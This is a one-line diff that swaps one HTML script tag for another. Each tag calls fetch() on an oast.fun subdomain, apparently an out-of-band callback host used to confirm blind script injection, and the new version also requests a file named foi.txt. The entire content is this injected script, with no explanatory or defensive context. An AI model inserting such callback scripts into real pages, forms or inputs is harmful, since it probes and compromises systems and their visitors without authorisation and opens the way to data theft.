@@ -1,1 +1,1 @@
-<script>fetch('https://ptgzncftyzskzlhxfrjykirfza73h6wv1.oast.fun');</script>
+<script>fetch('https://dlltnmdydojegodhqoloqdh6gws9d8g3f.oast.fun/foi.txt');</script>
